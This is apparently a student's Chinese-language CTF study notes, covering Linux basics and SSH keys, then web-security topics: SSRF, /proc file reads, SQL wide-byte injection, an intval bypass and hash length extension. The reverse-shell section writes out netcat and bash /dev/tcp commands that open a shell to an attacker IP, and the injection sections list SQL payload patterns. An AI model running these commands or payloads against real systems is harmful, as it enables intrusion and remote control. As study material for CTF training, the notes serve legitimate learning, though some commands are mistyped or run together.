+<p>srv可以视为service的缩写，是一些网路服务启动之后，这些服务所需要取用的<strong>资料目录</strong>。 常见的服务例如WWW, FTP等等。 举例来说，<strong>WWW伺服器需要的网页资料就可以放置在&#x2F;srv&#x2F;www&#x2F;里面。呵呵，看来平时我们编写的代码应该放到这里了。</strong></p>
+<p>&#x2F;tmp</p>
+<p>这是让一般使用者或者是正在执行的程序<strong>暂时放置档案</strong>的地方。这个目录是任何人都能够存取的，所以你需要定期的清理一下。当然，重要资料不可放置在此目录啊。 因为FHS甚至建议在开机时，应该要将&#x2F;tmp下的资料都删除。</p>
+<p>还有下面这些</p>
+<p>&#x2F;lost+found</p>
+<p>这个目录是使用标准的ext2&#x2F;ext3档案系统格式才会产生的一个目录，目的在于当档案系统发生错误时，将一些遗失的片段放置到这个目录下。 这个目录通常会在分割槽的最顶层存在，例如你加装一个硬盘于&#x2F;disk中，那在这个系统下就会自动产生一个这样的目录&#x2F;disk&#x2F;lost+found</p>
+<p>&#x2F;proc</p>
+<p>这个目录本身是一个<strong>虚拟文件系统</strong>(virtual filesystem)喔。 他放置的资料都是在内存当中，例如系统核心、行程资讯(process)（是进程吗?）、周边装置的状态及网络状态等等。因为这个目录下的资料都是在记忆体（内存）当中，所以本身不占任何硬盘空间。比较重要的档案（目录）例如： &#x2F;proc&#x2F;cpuinfo, &#x2F;proc&#x2F;dma, &#x2F;proc&#x2F;interrupts, &#x2F;proc&#x2F;ioports, &#x2F;proc&#x2F;net&#x2F;*等等。呵呵，是虚拟内存吗[guest]？</p>
+<p>&#x2F;sys</p>
+<p>这个目录其实跟&#x2F;proc非常类似，也是一个<strong>虚拟的档案系统</strong>，主要也是记录与<strong>核心相关的资讯</strong>。 包括目前已载入的核心模组与核心侦测到的硬体装置资讯等等。 这个目录同样不占硬盘容量。</p>
+<p>推荐博客</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/silence-hust/p/4319415.html">https://www.cnblogs.com/silence-hust/p/4319415.html</a></p>
+<h3 id="linux常见命令"><a href="#linux常见命令" class="headerlink" title="linux常见命令"></a>linux常见命令</h3><h5 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> whoami</span><br></pre></td></tr></table></figure>
+
+<h5 id="查看ip等信息"><a href="#查看ip等信息" class="headerlink" title="查看ip等信息"></a>查看ip等信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ifcinfig        //查询和配置网络接口</span><br><span class="line"> hostname -I  // 显示主机名ip</span><br><span class="line"> ip addr show  //查看ipv4，ipv6地址</span><br></pre></td></tr></table></figure>
+
+<h5 id="显示当前位置路径"><a href="#显示当前位置路径" class="headerlink" title="显示当前位置路径"></a>显示当前位置路径</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   pwd                         //显示当前位置路径</span><br></pre></td></tr></table></figure>
+
+<h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> find . -name &quot;*.c&quot;     //将目前目录及其子目录下所有延伸档名是 c 的文件列出来</span><br><span class="line"> find . -type f         //将目前目录其其下子目录中所有一般文件列出</span><br><span class="line"> find . -ctime -20      //将目前目录及其子目录下所有最近 20 天内更新过的文件列出</span><br><span class="line"> find /var/log -type f -mtime +7 -ok rm &#123;&#125; \;     //查找/var/log目录中更改时间在7日以前的普通文件，并在删除之前询问它们</span><br><span class="line"> find . -type f -perm 644 -exec ls -l &#123;&#125; \;       //查找前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件</span><br><span class="line"> find / -type f -size 0 -exec ls -l &#123;&#125; \;         //为了查找系统中所有文件长度为0的普通文件，并列出它们的完整路径</span><br></pre></td></tr></table></figure>
+
+<h5 id="系统信息（-）"><a href="#系统信息（-）" class="headerlink" title="系统信息（*）"></a>系统信息（*）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> uname -a    //可以显示一些重要的系统信息，例如内核名称、主机名、内核版本号、处理器类型之类的信息</span><br><span class="line"> ps -ef         //查看所有正在运行的进程</span><br><span class="line"> ps -aux     //显示所有用户打开的进程,包括无控制终端的进程   其中有其他用户的command</span><br><span class="line"> ping IP        //查看与此IP地址的连接情况</span><br><span class="line"> netstat -an    //查看当前系统端口</span><br><span class="line"> netstat -an  grep 8080     //查看指定端口</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。</span><br></pre></td></tr></table></figure>
+
+<p>从客户端来看，SSH提供两种级别的<strong>安全验证</strong>。</p>
+<p><strong>用于远程登录主机</strong></p>
+<p><strong>第一种级别（基于口令的安全验证）</strong></p>
+<p>只要你知道自己帐号和口令，就可以登录到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想连接的[服务器]。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人”这种方式的攻击。</p>
+<p><strong>第二种级别（基于密匙的安全验证）</strong></p>
+<p><strong>非对称加密</strong></p>
+<p>需要依靠<strong>密匙</strong>，也就是你必须为自己创建一对密匙，并把公用密匙放在需要访问的服务器上。如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的密匙进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用密匙，然后把它和你发送过来的公用密匙进行比较。如果两个密匙一致，服务器就用公用密匙加密“质询”（challenge）并把它发送给客户端软件。客户端软件收到“质询”之后就可以用你的私人密匙解密再把它发送给服务器。</p>
+<p>用这种方式，你必须知道自己密匙的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8F%A3%E4%BB%A4?fromModule=lemma_inlink">口令</a>。但是，与第一种级别相比，第二种级别不需要在网络上传送口令。</p>
+<p>第二种级别不仅加密所有传送的数据，而且“中间人”这种攻击方式也是不可能的（因为他没有你的私人密匙）。但是整个登录的过程可能需要10秒 。</p>
+<h4 id="公钥登录"><a href="#公钥登录" class="headerlink" title="公钥登录"></a>公钥登录</h4><p>1.服务器生成公私钥对（有些服务器开机自起）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> # cd</span><br><span class="line"> # ssh-keygen</span><br></pre></td></tr></table></figure>
+
+<p>2.将公钥导入authorized_keys文件,并将私钥保存到本地计算机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> # cat id_rsa.pub &gt;&gt;authorized_keys</span><br><span class="line"> # cat authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>id_rsa, id_rua.pub, authorized_keys 都在 ~&#x2F;.ssh目录下（ssh是用户目录下的<strong>隐藏文件</strong>）</p>
+<p>3.修改ssh配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> # vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
+
+<p>4.重启sshd服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> // centos系统</span><br><span class="line"> # systemctl restart sshd.service</span><br><span class="line"> // ubuntu系统</span><br><span class="line"> # /etc/init.d/sshd restart</span><br></pre></td></tr></table></figure>
+
+<h6 id="5-远程登录"><a href="#5-远程登录" class="headerlink" title="5.远程登录"></a>5.远程登录</h6><p>1.xshell登录（半自动化）</p>
+<p>2.命令登录</p>
+<p>修改权限，<strong>权限不修改成600可能会导致登录失败</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> # chmod 600 id_rsa</span><br><span class="line"> ​</span><br><span class="line"> # ssh root@[ip] -p[port] -i id_rsa</span><br><span class="line"> e.g:  ssh -i /home/cnss/.ssh/id_cnss -o StrictHostKeyChecking=no cnss@192.168.98.104</span><br><span class="line"> //StrictHostKeyChecking=no   加入此命令，实现一个非交互方式登录（题目环境需要）</span><br><span class="line"> //192.168.98.104是要登录的主机的ip，cnss@cnss_feedback_nginx</span><br></pre></td></tr></table></figure>
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>对linux服务器的[渗透测试]过程中，我们在getshell得到一个低权限的webshell后，由于webshell是<strong>非交互式</strong>shell，通常要反弹一个<strong>交互式</strong>的shell，然后进一步进行提权。</p>
+<p>反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务端，<strong>目标机主动发起请求到攻击机监听的端口</strong>，并将其命令行的<strong>输入输出</strong>转到攻击机。</p>
+<p>关键是目标机有一个操作条件，可以主动发起请求，并且要能够<strong>访问外网</strong>，目标机需要是别人都能访问的外网</p>
+<p>下面介绍几种方式</p>
+<h6 id="netcat反弹"><a href="#netcat反弹" class="headerlink" title="netcat反弹"></a><strong>netcat反弹</strong></h6><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。使用它你可以轻易的建立任何连接。</p>
+<p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake &amp;&amp; make installmake clean</span><br></pre></td></tr></table></figure>
+
+<p>安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<p> netcat -lvvp 2333</p>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<p> netcat 47.xxx.xxx.72 2333 -e &#x2F;bin&#x2F;bash# nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e &#x2F;bin&#x2F;bash</p>
+<h6 id="利用Bash反弹shell"><a href="#利用Bash反弹shell" class="headerlink" title="利用Bash反弹shell"></a><strong>利用Bash反弹shell</strong></h6><p>个人感觉反弹shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：</p>
+<p><strong>目标机主动连接主机：</strong></p>
+<p> bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1      &#x2F;&#x2F;或者<br> bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1”    </p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机IP&#x2F;攻击机端口 0&gt;&amp;1   </p>
+<p>建议用引号来包裹bash命令</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<p> nc -lvvp 2333</p>
+<h2 id="Mid-CNSS-Proxy"><a href="#Mid-CNSS-Proxy" class="headerlink" title="[Mid] CNSS Proxy"></a>[Mid] CNSS Proxy</h2><h3 id="proc-directory"><a href="#proc-directory" class="headerlink" title="proc directory"></a>proc directory</h3><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><p>一种文件系统，一种<strong>伪文件</strong>系统（也即虚拟文件系统）伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p>
+<p>由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统是动态从系统内核读出所需信息并提交的</p>
+<p>用户可以通过这些文件查看有关<strong>系统硬件</strong>及当前正在<strong>运行进程</strong>的信息，甚至可以通过更改其中某些文件来改变<strong>内核</strong>的运行状态。</p>
+<p>还有的是一些以数字命名的目录，它们是<strong>进程目录</strong>。系统中当前运行的每一个进程都有对应的一个目录在&#x2F;proc下，以进程的 PID号为目录名，它们是<strong>读取进程信息的接口</strong>。而<strong>self</strong>目录则是<strong>读取进程本身</strong>的信息接口，是一个link。</p>
+<h4 id="各种目录"><a href="#各种目录" class="headerlink" title="各种目录"></a>各种目录</h4><p>&#x2F;proc&#x2F;<strong>cmdline</strong></p>
+<p>载入 kernel 时所下达的相关指令与参数！查阅此文件，可了解指令是如何启动的！</p>
+<p>例如：pythonloader.pyc 中间空格被省略掉了，用readline能查看完整的。 此语句意思是用python运行loader.pyc</p>
+<p><strong>&#x2F;proc&#x2F;N&#x2F;environ</strong></p>
+<p>进程环境变量列表</p>
+<p>&#x2F;proc&#x2F;N&#x2F;<strong>exe</strong></p>
+<p>exe 是一个指向启动当前进程的<strong>可执行文件（完整路径）</strong>的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径</p>
+<p><strong>&#x2F;proc&#x2F;maps</strong></p>
+<p>当前进程关联到的每个<strong>可执行文件和库文件</strong>在内存中的映射区域及其访问权限所组成的列表</p>
+<p>找到&#x2F;app后的文件：app.cpython-39-x86_64-linux-gnu.so</p>
+<p>特殊格式： .so结尾，有<strong>版本号信息</strong></p>
+<p><strong>&#x2F;proc&#x2F;N&#x2F;fd</strong></p>
+<p>包含进程相关的所有的<strong>文件描述符</strong></p>
+<p>&#x2F;proc&#x2F;cpuinfo</p>
+<p>本机的 <strong>CPU 的相关信息</strong>，包含<strong>频率</strong>、<strong>类型</strong>与<strong>运算功能</strong>等</p>
+<p>&#x2F;proc&#x2F;modules</p>
+<p>目前我们的 Linux 已经载入的<strong>模块列表</strong>，也可以想成是驱动程序啦！</p>
+<p>&#x2F;<strong>proc</strong>&#x2F;fb</p>
+<p>帧缓冲设备列表，包括数量和控制它的驱动</p>
+<p>&#x2F;proc&#x2F;stat</p>
+<p>系统的一些状态信息，所有的CPU活动信息</p>
+<p><strong>&#x2F;proc&#x2F;N&#x2F;cwd</strong></p>
+<p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录</p>
+<p>app.cpython-39-x86_64-linux-gnu.so</p>
+<p>cat &#x2F;proc&#x2F;N&#x2F;cwd&#x2F;filename</p>
+<p>打开进程当前<strong>运行文件</strong></p>
+<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h4><p>在真正做题的时候，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取&#x2F;proc&#x2F;self&#x2F;cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如<strong>文件包含</strong>漏洞，或者<strong>SSTI</strong>使用<strong>file模块</strong>，<strong>ssrf</strong>，<strong>目录穿越</strong>读取文件）的方式读取&#x2F;proc&#x2F;self&#x2F;cmdline。</p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/f46efe060b8444df05d6aee5f2a9c87a.png" style="zoom:67%;" />
+
+<p>(Server-Side Request Forgery:<strong>服务器端请求伪造</strong>)</p>
+<p>是<strong>攻击者</strong>让<strong>服务端发起构造的指定请求</strong>链接造成的漏洞。</p>
+<p>首先要知道出现ssrf的函数基本就这几个file_get_contents()、curl()、fsocksopen()、fopen()，如果获取到题目源码了，源码中存在这些个函数就大致可以判断是否有ssrf，如果没有题目的源码，ssrf的入口一般是出现在调用外部资源的地方，比如url有个参数让你传或者是在html中的输入框，然后就用http:&#x2F;&#x2F;，file:&#x2F;&#x2F;，dict:&#x2F;&#x2F;协议读取一下。</p>
+<p>SSRF攻击的目标是从[外网]无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） 内部系统与外网隔绝，但却和服务器相连，服务器可以对内网发起请求。</p>
+<p>ssrf就是利用我们可以访问到的服务器，对其服务器下面的内网进行探测，也可以理解为服务器拥有外网ip，而我们要访问的电脑则是在公网ip进行nat后分配的内网ip</p>
+<ul>
+<li>1、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</li>
+<li>2、攻击运行在内网或本地的应用程序（比如溢出）</li>
+<li>3、对内网Web应用进行指纹识别，通过访问默认文件实现</li>
+<li>4、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）</li>
+<li>5、利用file协议读取文件</li>
+</ul>
+<h4 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> /?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>理解</p>
+<p><strong>正常访问</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/6b5a90d895a54753b79e70121a3f53c3.png" style="zoom: 50%;" />
+
+<p><strong>利用ssrf漏洞</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/bb49dd7a23e3425e9c42b257856edbd1-1024x363.png" style="zoom:50%;" />
+
+<p>也就是类似于代理的东西，原来把代理服务器作为代理访问外网，现在利用ssrf访问代理服务器内网ip</p>
+<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>file:&#x2F;&#x2F; — 访问本地文件系统 +绝对路径</p>
+<p>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</p>
+<p>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</p>
+<p>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流(I&#x2F;O streams)</p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> /?url=127.0.0.1:xxx       //xxx进行bp爆破</span><br></pre></td></tr></table></figure>
+
+<h4 id="这个题"><a href="#这个题" class="headerlink" title="这个题"></a>这个题</h4><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221018212020796.png"></p>
+<p>首先0.0.0.0:5000和127.0.0.1:5000都能访问到当前页面</p>
+<p>也就是存在ssrf注入，至于5000，是flask框架默认5000端口。</p>
+<p>然后进行file协议拿本地文件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221018212216521.png"></p>
+<h3 id="pycdc（re）"><a href="#pycdc（re）" class="headerlink" title="pycdc（re）"></a>pycdc（re）</h3><p><strong>py编译生成，开发商为了不泄露源码，为了提高加载速度。</strong></p>
+<p>pyc是一种<strong>二进制文件</strong>，是由py文件经过编译后，生成的文件，py文件变成pyc文件后，<strong>加载的速度有所提高</strong>，而且pyc是一种跨平台的字节码，是由[Python]的虚拟机来执行的，这个是类似于[Java]或者.NET的虚拟机的概念。pyc的内容，是跟python的<strong>版本相关</strong>的，不同版本编译后的pyc文件是不同的，2.5编译的pyc文件，2.4版本的python是无法执行的。</p>
+<p>可以反编译：pycdc。</p>
+<h3 id="cython"><a href="#cython" class="headerlink" title="cython"></a>cython</h3><p><strong>用python语法写c拓展，可以直接被python调用（import）</strong>，<strong>但是要注意版本号</strong></p>
+<p>Cython是一个<strong>编程语言</strong>，它通过<strong>类似Python的语法来编写C扩展并可以被Python调用</strong>.既具备了Python快速开发的特点，又可以让代码运行起来像C一样快，同时还可以方便地调用C library。</p>
+<h3 id="flask框架"><a href="#flask框架" class="headerlink" title="flask框架"></a>flask框架</h3><p>Python的常用<strong>框架</strong>，，轻量级，两个主要核心应用是Werkzeug和模板引擎Jinja.</p>
+<p>（dd）</p>
+<h2 id="Mid-CNSS-Database"><a href="#Mid-CNSS-Database" class="headerlink" title="[Mid] CNSS Database"></a>[Mid] CNSS Database</h2><p>“不会用了 <strong>Prepared Statement</strong> 你还能注入我吧”</p>
+<h4 id="Prepared-Statement"><a href="#Prepared-Statement" class="headerlink" title="Prepared Statement"></a>Prepared Statement</h4><h5 id="预编译语句"><a href="#预编译语句" class="headerlink" title="预编译语句"></a>预编译语句</h5><p>通常我们的一条sql在db接收到最终执行完毕返回可以分为下面三个过程：</p>
+<ol>
+<li>词法和语义解析</li>
+<li>优化sql语句，制定执行计划</li>
+<li>执行并返回结果</li>
+</ol>
+<p>这是普通语句称作<strong>Immediate Statements</strong>，就是没有经过预编译，直接将语句过滤优化后传给数据库，就有可能让数据被当成sql语句代码执行（也就是数据变成了代码）？</p>
+<p>但是很多情况，我们的一条sql语句可能会反复执行，或者每次执行的时候只有个别的值不同（比如query的where子句值不同，update的set子句值不同,insert的values值不同）。 如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。</p>
+<p>所谓预编译语句就是将这类语句中的值用占位符替代，可以视为将sql语句<strong>模板化或者说参数化</strong>，一般称这类语句叫<strong>Prepared Statements</strong>或者<strong>Parameterized Statements</strong> 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；预编译是用来提升SQL语句的响应速度的，将一段SQL语句定制成模板，把灵活的参数作为[占位符]让我们传递进去，达到多次执行相同的SQL语句必须要重复校验、解析等操作；</p>
+<p><strong>此外预编译语句能防止sql注入。</strong>为什么？</p>
+<p>进行预编译之后，[sql语句]已经被数据库<strong>分析，编译和优化</strong>了，并且允许数据库以参数化的形式进行查询，所以即使有敏感字符数据库<strong>也会当做属性值</strong>来处理而不是sql指令了</p>
+<p>输入的数据被放进占位符里面，整个sql语句结构不会改变，也就不存在闭合的说法，相当于输入的东西只能作为属性值（数据）执行，而不能变成代码语句</p>
+<h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><p>我们可以看到输出的SQL文是<strong>把整个参数用引号包起来</strong>，并把<strong>参数中的引号作为转义字符</strong>，从而避免了参数也作为条件的一部分</p>
+<p>绕过需要两点，防止引号被转义，然后闭合语句 防止转义&#x3D;》宽字节注入</p>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>先总结sql注入总共有哪些类型：</p>
+<p><strong>数字型注入： or 1&#x3D;1</strong> 在输入整形参数的地方</p>
+<p><strong>字符型注入： ‘ or 1&#x3D;1#</strong> 需要闭合引号</p>
+<p>**搜索型注入： %xxx% or 1&#x3D;1 #%&amp;**amp;#x27; 需要闭合%</p>
+<p><strong>XX型注入： xx’) or 1&#x3D;1#</strong> 需要闭合奇怪的东西</p>
+<p>方法：</p>
+<p><strong>联合查询（union）注入、布尔盲注(base on boolian)、时间盲注(base on time)、报错信息注入、宽字节注入、二次注入，偏移注入</strong></p>
+<p><strong>宽字节注入（⛔必须是GBK ⛔在 ‘ 前加 %df 用于绕过 )</strong></p>
+<p><strong>其中 \ 的URL编码是 %5C ，当我们在单引号前面加上 %df 的时候，最终就会变成 運’，如果程序的默认字符集是GBK等宽字节字符集，则 MYSQL 用 GBK 的编码时，会认为 %df 是一个宽字符，也就是 運，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就好注入了。</strong></p>
+<p>也就是本来单引号前面会有一个&#x2F;来转义，但是利用gbk中支持宽字节，再加一个让&#x2F;和%df变成宽字节，然后引号就逃逸了</p>
+<h4 id="pdo预处理"><a href="#pdo预处理" class="headerlink" title="pdo预处理"></a>pdo预处理</h4><p><strong>而PDO作为php中最典型的预编译查询方式</strong></p>
+<p>这个和预编译很像，如果理解不到位，只是简单使用PDO，就和addslashes()一样只是将引号转义了，</p>
+<p>实际上，在模拟预编译的情况下，PDO对于SQL注入的防范（PDO::queto()），无非就是将数字型的注入转变为字符型的注入，又用类似mysql_real_escape_string()的方法将单引号、双引号、反斜杠等字符进行了转义。</p>
+<p>将一些参数修改之后，就会发现不论输入什么都会被当成数据处理（十六进制转码）</p>
+<p>正因为上面这句话，</p>
+<p>Prepare语句最大的特点就是它可以将16进制串转为语句字符串并执行。如果我们发现了一个存在堆叠注入的场景，但过滤非常严格，便可以使用prepare语句进行绕过。</p>
+<h2 id="Mid-ezpad"><a href="#Mid-ezpad" class="headerlink" title="[Mid] ezpad"></a>[Mid] ezpad</h2><h3 id="脚本爆破"><a href="#脚本爆破" class="headerlink" title="脚本爆破"></a>脚本爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> if (preg_match(&#x27;/^2022(.*?)CNSS$/&#x27;, $cnss)) </span><br><span class="line"> ​</span><br><span class="line">     if (md5($cnss) === &#x27;a5e8a02c361fb593dae3f3ee3256de0f&#x27;)   &#123;</span><br><span class="line"> ​</span><br><span class="line">             echo md5($flag); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>cnss格式要求为：2022CNSS，在这种基础下破解md5，只能考虑脚本爆破</p>
+<p>附上抄的xl脚本(夏令营)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> #!/usr/bin/env python</span><br><span class="line"> # -*- coding:utf-8 -*-</span><br><span class="line"> # auther:youzhi</span><br><span class="line"> # time:2022/9/17</span><br><span class="line"> import string</span><br><span class="line"> import hashlib</span><br><span class="line"> payload = string.ascii_letters +string.digits+&quot;_&quot;</span><br><span class="line"> def calc_md5(s):</span><br><span class="line">     md5 = hashlib.md5(s.encode(&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">     if(md5 == &quot;8cd38fa45e987e3ed7d523bbd40ce74a&quot;):</span><br><span class="line">         print(s)</span><br><span class="line"> def getstr(payload, s, slen):</span><br><span class="line">     if(len(s) == slen):</span><br><span class="line">         #print(&quot;cnss&#123;&quot; + s + &quot;&#125;&quot;)            一个递归</span><br><span class="line">         calc_md5(&quot;cnss&#123;&quot; + s + &quot;&#125;&quot;) </span><br><span class="line">         return s</span><br><span class="line">     for i in payload:</span><br><span class="line">         sl = s + i</span><br><span class="line">         getstr(payload, sl, slen)</span><br><span class="line"> for i in range(25, 26):</span><br><span class="line">     getstr(payload,&#x27;&#x27;, i)</span><br></pre></td></tr></table></figure>
+
+<h3 id="intval绕过"><a href="#intval绕过" class="headerlink" title="intval绕过"></a>intval绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> intval($cnss) === intval(strrev($cnss)      //intval(2022***CNSS)===intval(CNSS***2022)</span><br></pre></td></tr></table></figure>
+
+<p>intval()函数将参数id转换为数值型 strrev将字符串取反</p>
+<p>前者至少2022往后，后者为零，现在需要让前者为0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> #intval有一些漏洞</span><br><span class="line"> 64 位系统上，最大带符号的 integer 值是 9223372036854775807。 </span><br><span class="line"> #有些时候返回最大值，有些时候返回0（取决于字符串最左侧的字符）</span><br><span class="line"> 空数组也会返回0，非空数组返回1，此处不能是空数组，因此不能利用这个绕过</span><br><span class="line"> 2022e***(数字)</span><br><span class="line"> 变成指数形式  是指以10为底的指数。代表的就是科学记数法，e5就代表10^5</span><br></pre></td></tr></table></figure>
+
+<h3 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h3><p>（hash length extension）</p>
+<p><strong>指针对某些允许包含额外信息的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>散列函数的攻击手段。次攻击适用于MD5和SHA-1等基于Merkle–Damgård构造的算法</strong></p>
+<p>哈希摘要算法，如MD5,SHA1, SHA2等，都是基于Merkle–Damgård结构。这类算法有一个很有意思的问题：如果你知道message和MAC，只需再知道key的长度，尽管不知道key的值，也能在message后面添加信息并计算出相应MAC。</p>
+<p>Example: message + padding +extension</p>
